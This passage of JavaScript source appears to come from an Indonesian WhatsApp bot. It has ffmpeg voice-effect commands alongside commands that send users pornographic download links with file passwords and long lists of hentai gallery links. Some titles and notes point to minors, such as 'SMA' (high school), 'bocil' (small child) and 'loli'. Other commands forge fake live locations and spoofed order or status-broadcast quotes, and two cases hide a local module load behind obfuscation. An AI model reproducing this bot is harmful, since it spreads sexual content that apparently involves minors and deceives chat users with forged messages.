             anu = await getBuffer(`https://api.zeks.me/api/breakwall?apikey=Alphabott&text=${F}`)
             Hisnu.sendMessage(from, anu, image, {caption: `OK it's done`, quoted: ftroli})
             break   
   case 'fast':
			 encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		     media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
			 ran = getRandom('.mp3')
			 exec(`ffmpeg -i ${media} -filter:a "atempo=1.63,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
		  	 fs.unlinkSync(media)
			 if (err) return reply('Error!')
			 uhh = fs.readFileSync(ran)
			 Hisnu.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
			 fs.unlinkSync(ran)
			 })
			 break
  case 'tupai':
			 encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			 media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
			 ran = getRandom('.mp3')
			 exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
			 fs.unlinkSync(media)
			 if (err) return reply('Error!')
			 hah = fs.readFileSync(ran)
			 Hisnu.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
			 fs.unlinkSync(ran)
			 })
			 break
   case 'gemok':
			 encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			 media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
			 ran = getRandom('.mp3')
		     exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
			 fs.unlinkSync(media)
			 if (err) return reply('Error!')
			 hah = fs.readFileSync(ran)
			 Hisnu.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
			 fs.unlinkSync(ran)
			 })
			 break
    case 'bass':                 		
			 encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			 media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
		 	 ran = getRandom('.mp3')
			 exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
			 fs.unlinkSync(media)
			 if (err) return reply('Error!')
			 hah = fs.readFileSync(ran)
			 Hisnu.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
			 fs.unlinkSync(ran)
			 })
			 break
    case 'ghost':
		     encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			 media = await Hisnu.downloadAndSaveMediaMessage(encmedia)
			 ran = getRandom('.mp3')
			 exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
			 fs.unlinkSync(media)
			 if (err) return reply('Error!')
			 hah = fs.readFileSync(ran)
		     Hisnu.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
             fs.unlinkSync(ran)
			 })
		     break
//Fitur Yg Gw Tambahin Sendiri && Case nyolong
    case 'sharelock':
               kntl = `${args.join(' ')}`
               nama = kntl.split("|")[0];
               impostor = kntl.split("|")[1];
               Hisnu.sendMessage(from, {
               degreesLatitude: 999,
               degreesLongitude: 999,
               name: nama,
               address: impostor,
               jpegThumbnail: fakeimage}, MessageType.liveLocation, {quoted:ftroli})
               break
    case 'fliptext':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (args.length < 1) return reply(`Example:\n${prefix}fliptext Hisnu`)
               quere = args.join(" ")
               flipe = quere.split('').reverse().join('')
               reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
               break
    case 'randombokep':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               const bkp =['Nama : DilaPye Colmek\nFoto : -\nVideo : 1\nSize : 90 MB\nDurasi : 5 Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1We9TeG1whjz2bmNCrahctK1-Hiy3BtWN/view \n PASSWORD FILE : AA18+#29','Nama : Missluttyv SMA\nFoto : -\nVideo : 3\nSize : 74 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1TodhXRAHt6MHMqS2-3DYmCQoIFe7yuI-/view \nPASSWORD FILE : AA18+#21','Nama : Arce\nFoto : 114\nVideo : 16\bSize : 64 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1SwXbmd2sXnYSNYmn_tdCiaBsHHXjYvQM/view \nPASSWORD FILE : AA18+#6','Nama : Annisa\nFoto : 71\nVideo : 2\nSize : 48 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1St_Pb9xNZnrSX_fPfaarno6Bpjc3ArUx/view\nPASSWORD FILE : AA18+#5','Nama : Annisa\nFoto : 71\nVideo : 2\nSize : 48 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1St_Pb9xNZnrSX_fPfaarno6Bpjc3ArUx/view\nPASSWORD FILE : AA18+#5','Nama : 038493040494_0[Ws_Gloia]\nFoto : 19\nVideo : 1\nSize : 379 MB\nDurasi : 8 Menit\nKualitas : HD++\nRate : ⭐⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1Y0ALFotYLT2F8kKjgxMZ_BFJ6vWKalck/view\nPASSWORD FILE : AA18+#30','Nama : ASD - Ria Bali\nFoto : -\nVideo : 1\nSize : 165 MB\nDurasi : 45 Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1T84UWWj1oJlDAMXd-snZr6gP4Yt61P6P/view\nPASSWORD FILE : AA18+#7','Nama : Nanad Apr\nFoto : 18\nVideo : 23\nSize : 357 MB\nDurasi : - Menit\nKualitas : -\nRate : ⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1YO0rvEgbx6Qsrtfm6tTOlvHI7OE5V42p/view\nPASSWORD FILE : AA18+#32','Nama : lily kawai onlyfans\nFoto : 50\nVideo : 7\nSize : 237 MB\nDurasi : - Menit\nKualitas : HD+\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1TcK_EH1d2vL4bfVhSBm0el_nhmqh2XCS/view\nPASSWORD FILE : AA18+#17','Nama : Bocil x Tante\nFoto : -\nVideo : 1\nSize : 156 MB\nDurasi : 23 Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1amwgPTf_PLIUc43bxivztFrD0xzdg8Tm/view\nPASSWORD FILE : AA18+#33','Nama : Badbitch_alter\nFoto : -\nVideo : 1\nSize : 170 MB\nDurasi : 26 Menit\nKualitas : HD+\nRate : ⭐⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1b2k9RvUeirTzfHBZJkQ9fgw0jJudGP2j/view\nPASSWORD FILE : AA18+#34','Nama : Princess nakal\nFoto : -\nVideo : 1\nSize : 128 MB\nDurasi : 15 Menit\nKualitas : HD\nRate : ⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1bj6nNKADyIzSXONZnmXs7c8E_Ln_3KlM/view\nPASSWORD FILE : AA18+#35','Nama : weweci\nFoto : -\nVideo : 1\nSize : 180 MB\nDurasi : 21 Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1cA-pPAB_WRGRRGxhBDk9ouDiynu17xPg/view\nPASSWORD FILE : AA18+#36','Nama : Viral Katanya\nFoto : -\nVideo : 1\nSize : 26 MB\nDurasi : 5 Menit\nKualitas : HD\nRate : ⭐⭐⭐\n\nDownload Link\nDownload : http://www.mediafire.com/file/9o80ka9z61cdtn1/%23Viral_katanya.zip/file','Nama : Hijab hitam\nFoto: -\nVideo : 4\nSize : 20 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1gM7UvH1jzxYek88mQnWBQmou78Gerb_w/view','Nama : Syifa\nFoto : 45\nVideo : 25\nSize : 100 MB\nDurasi : - Menit\nKualitas : HD+\nRate : ⭐⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1gTjGotGSlpRCZiLKaZ14sOLjBjirntUb/view\nPassword file : AA18+#27','Nama : Danca\nFoto : 18\nVideo : 13\nSize : 100 MB\nDurasi : - Menit\nKualitas : HD+\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1hDxgMnQ4ps2DkVhFyc51ApdsavGfqs3B/view\nPassword file : AA18+#38','Nama : Dewi\nFoto : 266\nVideo : 3\nSize : 150 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1iVfhweyoExOcSCq-LHvJSHRp7pmbNmzg/view\nPassword file : AA18+#40','Nama : Jenn\nFoto : 50\nVideo : 7\nSize : 105 MB\nDurasi : - Menit\nKualitas : HD+\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1jqYvhwGLp8BgTItHRQpONu1MX3o4o12d/view\nPassword file : AA18+#41','Nama : Yanna Davud\nFoto : 61\nVideo : 5\nSize : 22 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1kIs0lNpZW-R5ub09GiQG6-wgdfagoZsV/view\nPassword file : AA18+#41','Nama : Nina fika luna\nFoto : 30\nVideo : 28\nSize : 153 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1kirVFR8V7aYAvY_6s9v5QKyxy5hRQw-X/view\nPassword file : AA18+#42','Nama : Ain Penang\nFoto : 53\nVideo : 7\nSize : 42 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1kzGeQKuKaQKiz6u_JEcPh9wuJGKVB-sv/view\nPassword file : AA18+#43','Nama : Jilboobs\nFoto : -\nVideo : 8\nSize : 84 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1l6M6JXmNiHGaybQiHH39wucVhvLkTjkX/view\nPassword file : AA18+#44','Nama : Kiki hijab\nFoto : -\nVideo : 14\nSize : 190 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1lZDvGBclp35JxhWRpVSCrVOO5YhIQSSn/view\nPassword file : AA18+#45','Nama : Tifanny\nFoto : 117\nVideo : 4\nSize : 30 MB\nDurasi : - Menit\nKualitas : HD\nRate : ⭐⭐⭐⭐\n\nDownload Link\nDownload : https://drive.google.com/file/d/1lrO9YJ1-MJtHavMpN2kG3nmJSReJtzE6/view\nPassword file : AA18+#46']
               const bocep = bkp[Math.floor(Math.random() * bkp.length)]
               bok = await getBuffer(`https://telegra.ph/file/701c1ff17ef990db7cea7.jpg`)
               Hisnu.sendMessage(from, bok, image, { caption: '*Download Sendiri Nih↓↓*\n\n'+ bocep, quoted: ftroli })
               break
    case 'linkbokep':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               novpn = `[ *API SC* ]\n`
               novpn += `➻ *NO VPN1* : bit.ly/2Qn9Qgu\n`
               novpn += `➻ *NO VPN2* : bit.ly/3gWaBt8\n`
               novpn += `➻ *XNXX VPN* : bit.ly/3vJZJ7n\n`
               reply(novpn)
               break
   case 'nekopoi1':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
               Hisnu.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA:\nhttps://www2.zippyshare.com/d/z9dcY6Nr/791216/%5bNekoPoi%5d_Akina_to_Onsen_de_H_Shiyo%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
   case 'nekopoi2':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
               Hisnu.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA:\nhttps://www4.zippyshare.com/d/j7PFLGUY/946757/%5bNekoPoi%5d_Tsuma_ga_Kirei_ni_Natta_Wake_-_02_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
  case 'nekopoi3':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
               Hisnu.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA:\nhttps://www111.zippyshare.com/d/EK5uqIMh/566060/%5bNekoPoi%5d_Megane_no_Megami_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
  case 'nekopoi4':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
               Hisnu.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA:\nhttps://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
  case 'nekopoi5':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
               Hisnu.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA:\nhttps://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
  case 'nekopoi6':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
               Hisnu.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA:\nhttps://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
  case 'nekopoi7':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
               Hisnu.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA:\nhttps://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
  case 'nekopoi8':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
               Hisnu.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA:\nhttps://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_Himekishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
  case 'nekopoi9':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
               Hisnu.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA:\nhttps://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
 case 'kodenuklir':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
			     try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
				var kodenuk = `Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/
Note : Easy mode = Sange, Biasa Aja, Mental Lemah :v
==============================
Medium Mode = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
Hard Mode = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
Kode nuklir dr milf oneesan ampe gan***** loli
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/

Happy Mother's Day 
165310,177978,211759,212643,229540, 250029,211519,256097,163478, 91505, 79280, 260629,128051,121972,261633,172044,119055,208323,149942,161236, 177150,233766,97949,230107 ,175822, 213545,232837,179166,138603,130183, 173543,234642,268015,228293,268893, 239536,

Random
257892 226942 236297 216039 221711 245304 166174 175220 244327 191049 220882 244859 227446 259328 259532 259634 259610 259348 258669 256097 118282 260028 260058 259557 259497 122220 260111 260088 259880 258977 260097 259765 259359 260138 259617 107965 197255 260276 260209 260210 260203 191360 191390 248933 257567 227913 211648 210240 260626 259622 257991 213966 260623 149112 257168 198203 114783 220958 244387 243734 223315 118069 136188 260686 241777  260912 142154 119798 261174 258301 256808 169134 220354 260271 261725 261378 252174 261928 114427 187003 147577 249458 157767 224316 175294 258450 233864 236128 261162 174036 187205 210873 193318 110232 199310 193816 220376 193814 193815 219068 220386 177642 188269 181837 220377 119293 257528 258926 262384 105951 259904 208174 249229 245644 262538 234818 216845 149212 134442 135927 262447 261811 261650 261225 261226 260761 250327 192327 167801 150309 123554`
				Hisnu.sendMessage(from, fcrew, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 300, status: 200, thumbnail: fakeimage, surface: 200, message: `${ucapanWaktu} ${pushname}👋\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, caption: kodenuk, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
    case 'public':
          	if (!mek.key.fromMe && !isOwner) return fakestatus('SELF-BOT')
          	if (banChats === false) return
          	banChats = false
          	fakestatus(`𝙋𝙐𝘽𝙇𝙄𝘾 𝙇𝙊𝙍𝘿`)
          	break
	case 'self':
          	if (!mek.key.fromMe && !isOwner) return fakestatus('SELF-BOT')
          	if (banChats === true) return
          	uptime = process.uptime()
         	banChats = true
          	fakestatus(`𝙎𝙀𝙇𝙁 𝙇𝙊𝙍𝘿`)
          	break					  
//------------------< Menunya Bang:v >-------------------
      
 case 'koder':
                 if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
			     try {
				             imageMsg = (await Hisnu.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/Menu.jpg`)})).imageMessage
				} catch {
					          imageMsg = (await Hisnu.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/Menu.jpg`)})).imageMessage
				}
				fcrew = await getBuffer(imageMsg)
				var kodenuk = `Easy Mode : ASU`
 Hisnu.sendMessage(from, fcrew, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 300, status: 200, thumbnail: fakeimage, surface: 200, message: `${ucapanWaktu} ${pushname}👋\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, caption: kodenuk, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
        case 'snk':  
      case 'rules':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
            Hisnu.sendMessage(from, rulesBot(prefix), MessageType.text, {quoted: ftroli})
            break
      case 'infoowner':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             Hisnu.sendMessage(from, infoOwner(prefix), MessageType.text, {quoted: ftroli})
             break    
      case 'jadibot':
             const _0x5f10=['1ubdcbO','202171TkLMwo','284052dVVNCo','42JxCsde','24890OaehfM','./jadibot.js','26826mdmYhJ','176EqLcNV','55194kArISZ','6GRvhmu','314893OwJFDH'];const _0x470b71=_0x5476;function _0x5476(_0x56372d,_0x51b653){return _0x5476=function(_0x5f107a,_0x54761a){_0x5f107a=_0x5f107a-0xd8;let _0x336fbf=_0x5f10[_0x5f107a];return _0x336fbf;},_0x5476(_0x56372d,_0x51b653);}(function(_0x4b0f8a,_0x1f534e){const _0x1acfb6=_0x5476;while(!![]){try{const _0x55ab94=-parseInt(_0x1acfb6(0xdc))+parseInt(_0x1acfb6(0xe2))*parseInt(_0x1acfb6(0xde))+-parseInt(_0x1acfb6(0xe1))*parseInt(_0x1acfb6(0xdb))+parseInt(_0x1acfb6(0xda))+-parseInt(_0x1acfb6(0xdd))+parseInt(_0x1acfb6(0xdf))+parseInt(_0x1acfb6(0xd8))*parseInt(_0x1acfb6(0xd9));if(_0x55ab94===_0x1f534e)break;else _0x4b0f8a['push'](_0x4b0f8a['shift']());}catch(_0x4a8ec9){_0x4b0f8a['push'](_0x4b0f8a['shift']());}}}(_0x5f10,0x285aa));const {jadibot}=require(_0x470b71(0xe0));jadibot(Hisnu,from,sender,reply,mek);
             break
      case 'stopjadibot':
      case 'stopbot':
             const _0x1427=['2584oRLTbU','3849mFwfyJ','./jadibot.js','71LvrzJG','286372cCrXrQ','1yPMtDu','1AjjlYF','456046PuhVDs','394eRcMph','746574pwCcoE','625699UVPwUh','1029671oWZdcF'];const _0x49a386=_0x39bb;function _0x39bb(_0x399e0b,_0x2d0c73){return _0x39bb=function(_0x1427be,_0x39bbc5){_0x1427be=_0x1427be-0x132;let _0x12e62d=_0x1427[_0x1427be];return _0x12e62d;},_0x39bb(_0x399e0b,_0x2d0c73);}(function(_0x49c476,_0x4d8227){const _0x22a1e5=_0x39bb;while(!![]){try{const _0x311704=parseInt(_0x22a1e5(0x138))*parseInt(_0x22a1e5(0x13c))+parseInt(_0x22a1e5(0x13b))*parseInt(_0x22a1e5(0x136))+-parseInt(_0x22a1e5(0x134))+-parseInt(_0x22a1e5(0x13d))*parseInt(_0x22a1e5(0x133))+parseInt(_0x22a1e5(0x137))+-parseInt(_0x22a1e5(0x139))+-parseInt(_0x22a1e5(0x13a))*parseInt(_0x22a1e5(0x135));if(_0x311704===_0x4d8227)break;else _0x49c476['push'](_0x49c476['shift']());}catch(_0x25e28b){_0x49c476['push'](_0x49c476['shift']());}}}(_0x1427,0x8b9f1));const {stopjadibot}=require(_0x49a386(0x132));stopjadibot(Hisnu,from,sender,mek);
             break  
default:
if (fs.existsSync(`./media/${from}.json`)) {
	gelutSkuy = setGelud(`${from}`)
	if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
